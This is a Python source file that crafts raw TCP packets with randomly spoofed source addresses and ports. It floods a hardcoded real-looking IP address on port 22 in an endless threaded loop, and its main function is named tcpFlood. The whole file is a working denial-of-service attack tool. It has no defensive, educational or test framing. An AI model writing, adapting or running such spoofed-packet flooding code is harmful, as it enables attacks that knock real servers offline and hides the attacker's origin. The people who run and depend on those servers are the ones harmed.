import array
import socket
import struct
import random
import threading

def chksum(packet: bytes) -> int:
    if len(packet) % 2 != 0:
        packet += b'\0'

    res = sum(array.array("H", packet))
    res = (res >> 16) + (res & 0xffff)
    res += res >> 16

    return (~res) & 0xffff

def randomIP():
    return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'

def randomPort():
    return random.randint(1,50000)

class TCPPacket:
    def __init__(self,
                 src_host:  str,
                 src_port:  int,
                 dst_host:  str,
                 dst_port:  int,
                 flags:     int = 0):
        self.src_host = src_host
        self.src_port = src_port
        self.dst_host = dst_host
        self.dst_port = dst_port
        self.flags = flags

    def build(self) -> bytes:
        ihl = 5
        version = 4
        tos = 0
        tot_len = 20 + 20
        id = random.randint(1,65535)
        frag_off = 0
        ttl = random.randint(1,255)
        protocol = socket.IPPROTO_TCP
        check = 10 
        saddr =socket.inet_aton ( self.src_host )
        daddr = socket.inet_aton ( self.dst_host )
        ihl_version = (version << 4) + ihl
        ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        
        packet = struct.pack(
            '!HHIIBBHHH',
            self.src_port,  # Source Port
            self.dst_port,  # Destination Port
            0,              # Sequence Number
            0,              # Acknoledgement Number
            5 << 4,         # Data Offset
            self.flags,     # Flags
            8192,           # Window
            0,              # Checksum (initial value)
            0               # Urgent pointer
        )

        pseudo_hdr = struct.pack(
            '!4s4sHH',
            socket.inet_aton(self.src_host),    # Source Address
            socket.inet_aton(self.dst_host),    # Destination Address
            socket.IPPROTO_TCP,                 # PTCL
            len(packet)                         # TCP Length
        )

        psh = pseudo_hdr + packet
        tcp_checksum = chksum(psh)
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            self.src_port,  # Source Port
            self.dst_port,  # Destination Port
            0,              # Sequence Number
            0,              # Acknoledgement Number
            5 << 4,         # Data Offset
            self.flags,     # Flags
            8192,           # Window
            tcp_checksum,              # Checksum (initial value)
            0               # Urgent pointer
        )
        return ip_header + tcp_header

        # checksum = chksum(pseudo_hdr + packet)

        # packet = packet[:16] + struct.pack('H', checksum) + packet[18:]

        # return packet

def tcpFlood():
    dst = '185.43.206.93'

    while True:
        pak = TCPPacket(
            randomIP(),
            randomPort(),
            dst,
            22,
            0b000101001
        )
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        for i in range(3):
            s.sendto(pak.build(), (dst, 0))


if __name__ == '__main__':
    for i in range(1):
        print("Thread ", i, "Started")
        t = threading.Thread(target=tcpFlood)
        t.start()
